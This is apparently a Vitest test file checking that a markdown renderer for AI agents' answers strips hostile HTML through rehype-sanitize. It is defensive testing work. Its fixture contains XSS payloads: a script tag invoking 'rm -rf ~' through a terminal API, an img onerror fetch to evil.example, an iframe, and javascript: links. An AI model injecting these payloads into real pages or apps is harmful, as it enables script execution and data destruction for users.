/**
 * The hostile answer fixture (Phase 137.1), run rather than read.
 *
 * The overview renders an agent's closing answer as markdown through the
 * editor's own pipeline with `rehype-sanitize` in the chain and `rehype-raw`
 * ABSENT. The answer is an agent's bytes, so the phase's proof is a fixture
 * carrying a script tag, an img onerror, an iframe and a javascript: link,
 * rendered for real, with none of them reaching the markup.
 *
 * This renders AnswerMarkdown itself — the component the loaded chunk hands
 * the overview — with `renderToStaticMarkup`, the same shape
 * p95-strip-note.test.tsx uses, because this repository carries no jsdom.
 * The DOM half of the same proof runs in build/probe-p137-overview.mjs,
 * which reads the live page for the same four shapes.
 *
 * The second describe proves the point of the phase in the same run: a
 * list, a fence, inline code, an external link and a plain ask all draw as
 * what they are.
 */

import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { AnswerMarkdown } from '../../editor/markdown/markdown-impl';

/** The four hostile shapes the Phase 137.1 entry names, in one answer. */
const HOSTILE_ANSWER = [
  'Before the attack.',
  '<script>window.gmux.terminalWrite("rm -rf ~")</script>',
  '<img src=x onerror="fetch(\'https://evil.example/x\')">',
  '<iframe src="https://evil.example/frame"></iframe>',
  '[click me](javascript:alert(document.title))',
  '<a href="javascript:alert(document.title)">raw link</a>',
  'After the attack.'
].join('\n\n');

function render(source: string): string {
  return renderToStaticMarkup(
    <AnswerMarkdown source={source} highlighter={null} />
  );
}

describe('the hostile answer fixture', () => {
  const markup = render(HOSTILE_ANSWER);

  it('still renders the words around the attack', () => {
    expect(markup).toContain('Before the attack.');
    expect(markup).toContain('After the attack.');
  });

  it('lets no script element through', () => {
    expect(markup).not.toContain('<script');
  });

  it('lets no iframe through', () => {
    expect(markup).not.toContain('<iframe');
    expect(markup).not.toContain('evil.example/frame');
  });

  it('lets no event handler attribute through', () => {
    expect(markup).not.toContain('onerror');
    expect(markup).not.toContain('evil.example/x');
  });

  it('lets no javascript: href through, from markdown or from raw HTML', () => {
    expect(markup).not.toContain('javascript:');
    // The markdown link's words survive with the href stripped: the
    // sanitizer removes the protocol, and the component renders a link
    // without an http(s) href as inert text.
    expect(markup).toContain('click me');
    expect(markup).not.toMatch(/<a[^>]*>click me/);
  });
});

describe('what an answer draws as', () => {
  it('draws a list as a list', () => {
    const markup = render('- first thing\n- second thing\n');
    expect(markup).toContain('<ul>');
    expect(markup).toContain('<li>first thing</li>');
  });

  it('draws a fence as a code block', () => {
    const markup = render('```sh\necho signed\n```\n');
    expect(markup).toContain('<pre>');
    expect(markup).toContain('echo signed');
  });

  it('draws inline code as code', () => {
    const markup = render('the fix is in `scripts/release.sh` now');
    expect(markup).toContain('<code>scripts/release.sh</code>');
  });

  it('draws an external link as a link that main will open outside', () => {
    const markup = render('[the docs](https://example.com/docs)');
    expect(markup).toMatch(/<a[^>]*href="https:\/\/example\.com\/docs"/);
  });

  it('draws a relative link inert', () => {
    const markup = render('[the file](./src/nest_counter.py)');
    expect(markup).toContain('the file');
    expect(markup).not.toMatch(/<a[^>]*href="\.\/src/);
  });

  it('draws an image as its alt text and never loads it', () => {
    const markup = render('![the graph](https://evil.example/pixel.png)');
    expect(markup).not.toContain('<img');
    expect(markup).toContain('the graph');
    expect(markup).not.toContain('evil.example');
  });
});
